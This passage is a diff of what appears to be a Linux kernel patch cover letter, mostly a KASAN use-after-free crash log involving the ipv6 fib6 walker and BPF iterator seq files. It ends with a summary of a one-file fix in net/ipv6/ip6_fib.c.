+[    9.380806]  inet6_rtm_delroute (net/ipv6/route.c:5669)
+[    9.380809]  ? __pfx_inet6_rtm_delroute (net/ipv6/route.c:5642)
+[    9.380812]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
+[    9.380817]  ? cap_capable (security/commoncap.c:82 security/commoncap.c:128)
+[    9.380819]  ? ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
+[    9.380823]  ? security_capable (security/security.c:660 (discriminator 8))
+[    9.380827]  ? __pfx_inet6_rtm_delroute (net/ipv6/route.c:5642)
+[    9.380829]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7137)
+[    9.380833]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1734 (discriminator 1))
+[    9.380836]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[    9.380839]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1734 (discriminator 1))
+[    9.380842]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2772 (discriminator 1))
+[    9.380846]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[    9.380848]  ? __pfx_netlink_unicast (net/netlink/af_netlink.c:1255)
+[    9.380851]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[    9.380854]  ? __pfx_netlink_sendmsg (net/netlink/af_netlink.c:1361)
+[    9.380857]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
+[    9.380860]  ? __pfx_____sys_sendmsg (net/socket.c:1151 (discriminator 1))
+[    9.380863]  ? __pfx_copy_msghdr_from_user (net/socket.c:2607)
+[    9.380865]  ? __sys_bpf (include/linux/instrumented.h:112 include/linux/atomic/atomic-instrumented.h:2961 kernel/bpf/syscall.c:3382 kernel/bpf/syscall.c:6153 kernel/bpf/syscall.c:6458)
+[    9.380869]  ? __pfx___sys_bpf (kernel/bpf/syscall.c:4289)
+[    9.380872]  ___sys_sendmsg (net/socket.c:2767)
+[    9.380875]  ? __pfx____sys_sendmsg (net/socket.c:2654)
+[    9.380878]  ? swake_up_one (include/linux/list.h:54 (discriminator 2) include/linux/list.h:334 (discriminator 2) kernel/sched/swait.c:31 (discriminator 2) kernel/sched/swait.c:22 (discriminator 2) kernel/sched/swait.c:53 (discriminator 2))
+[    9.380881]  ? rcu_segcblist_nextgp (kernel/rcu/rcu_segcblist.c:317)
+[    9.380885]  ? fdget (fs/file.c:1196 (discriminator 1) fs/file.c:1208 (discriminator 1))
+[    9.380889]  __sys_sendmsg (net/socket.c:2799)
+[    9.380891]  ? __pfx___sys_sendmsg (net/socket.c:2780)
+[    9.380894]  ? __x64_sys_bpf (kernel/bpf/syscall.c:6486 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2))
+[    9.380897]  ? __x64_sys_bpf (kernel/bpf/syscall.c:6486 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2))
+[    9.380900]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[    9.380903]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[    9.380906] RIP: 0033:0x52e65b
+[    9.380908] Code: 48 89 e5 48 83 ec 20 89 55 ec 48 89 75 f0 89 7d f8 e8 e9 67 03 00 8b 55 ec 48 8b 75 f0 41 89 c0 8b 7d f8 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 2d 44 89 c7 48 89 45 f8 e8 41 68 03 00 48 8b
+All code
+========
+   0:	48 89 e5             	mov    %rsp,%rbp
+   3:	48 83 ec 20          	sub    $0x20,%rsp
+   7:	89 55 ec             	mov    %edx,-0x14(%rbp)
+   a:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
+   e:	89 7d f8             	mov    %edi,-0x8(%rbp)
+  11:	e8 e9 67 03 00       	call   0x367ff
+  16:	8b 55 ec             	mov    -0x14(%rbp),%edx
+  19:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
+  1d:	41 89 c0             	mov    %eax,%r8d
+  20:	8b 7d f8             	mov    -0x8(%rbp),%edi
+  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	77 2d                	ja     0x5f
+  32:	44 89 c7             	mov    %r8d,%edi
+  35:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+  39:	e8 41 68 03 00       	call   0x3687f
+  3e:	48                   	rex.W
+  3f:	8b                   	.byte 0x8b
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	77 2d                	ja     0x35
+   8:	44 89 c7             	mov    %r8d,%edi
+   b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+   f:	e8 41 68 03 00       	call   0x36855
+  14:	48                   	rex.W
+  15:	8b                   	.byte 0x8b
+[    9.380911] RSP: 002b:00007ffcfc7e99e0 EFLAGS: 00000293 ORIG_RAX: 000000000000002e
+[    9.380914] RAX: ffffffffffffffda RBX: 0000000000000007 RCX: 000000000052e65b
+[    9.380916] RDX: 0000000000000000 RSI: 00007ffcfc7e9a30 RDI: 0000000000000007
+[    9.380918] RBP: 00007ffcfc7e9a00 R08: 0000000000000000 R09: 0000000000000006
+[    9.380919] R10: 0000000000000006 R11: 0000000000000293 R12: 00007ffcfc7eac90
+[    9.380921] R13: 0000000000000004 R14: 00007ffcfc7eb490 R15: 0000000000000001
+[    9.380924]  </TASK>
+[    9.380925]
+[    9.380925] Allocated by task 276:
+[    9.380927]  kasan_save_stack (mm/kasan/common.c:57)
+[    9.380930]  kasan_save_track (mm/kasan/common.c:78)
+[    9.380932]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
+[    9.380934]  __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5414 mm/slub.c:5439)
+[    9.380937]  __seq_open_private (include/linux/slab.h:995 include/linux/slab.h:1312 fs/seq_file.c:637)
+[    9.380939]  prepare_seq_file (kernel/bpf/bpf_iter.c:607)
+[    9.380942]  bpf_iter_new_fd (kernel/bpf/bpf_iter.c:650)
+[    9.380944]  __sys_bpf (kernel/bpf/syscall.c:6152 kernel/bpf/syscall.c:6458)
+[    9.380946]  __x64_sys_bpf (kernel/bpf/syscall.c:6486 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2))
+[    9.380948]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[    9.380950]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[    9.380952]
+[    9.380953] Freed by task 277:
+[    9.380954]  kasan_save_stack (mm/kasan/common.c:57)
+[    9.380956]  kasan_save_track (mm/kasan/common.c:78)
+[    9.380959]  kasan_save_free_info (mm/kasan/generic.c:584)
+[    9.380961]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
+[    9.380963]  kfree (include/linux/kasan.h:235 mm/slub.c:2748 mm/slub.c:6499 mm/slub.c:6792)
+[    9.380965]  seq_release_private (fs/seq_file.c:624)
+[    9.380967]  __fput (fs/file_table.c:512)
+[    9.380970]  fput_close_sync (fs/file_table.c:617)
+[    9.380971]  __x64_sys_close (fs/open.c:1560 fs/open.c:1545 fs/open.c:1545)
+[    9.380973]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[    9.380975]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[    9.380978]
+[    9.380978] The buggy address belongs to the object at ffff88800bfe99c0
+[    9.380978]  which belongs to the cache kmalloc-192 of size 192
+[    9.380980] The buggy address is located 96 bytes inside of
+[    9.380980]  freed 192-byte region [ffff88800bfe99c0, ffff88800bfe9a80)
+[    9.380983]
+[    9.380983] The buggy address belongs to the physical page:
+[    9.380985] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xbfe8
+[    9.380988] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
+[    9.380989] flags: 0x100000000000040(head|node=0|zone=1)
+[    9.380992] page_type: f5(slab)
+[    9.380995] raw: 0100000000000040 ffff8880010424c0 ffffea00001d2c10 ffffea0000251e90
+[    9.380997] raw: 0000000000000000 0000000000150015 00000000f5000000 0000000000000000
+[    9.381000] head: 0100000000000040 ffff8880010424c0 ffffea00001d2c10 ffffea0000251e90
+[    9.381002] head: 0000000000000000 0000000000150015 00000000f5000000 0000000000000000
+[    9.381004] head: 0100000000000001 ffffffffffffff81 00000000ffffffff 00000000ffffffff
+[    9.381006] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
+[    9.381007] page dumped because: kasan: bad access detected
+[    9.381008]
+[    9.381009] Memory state around the buggy address:
+[    9.381010]  ffff88800bfe9900: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[    9.381012]  ffff88800bfe9980: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
+[    9.381013] >ffff88800bfe9a00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[    9.381014]                                ^
+[    9.381029]  ffff88800bfe9a80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[    9.381031]  ffff88800bfe9b00: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00
+[    9.381032] ==================================================================
+[    9.381073] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  ipv6: fix fib6 walker UAF on seq stop
+
+ net/ipv6/ip6_fib.c | 4 ++--
+ 1 file changed, 2 insertions(+), 2 deletions(-)
 
 -- 
-2.52.0
+2.43.0
 
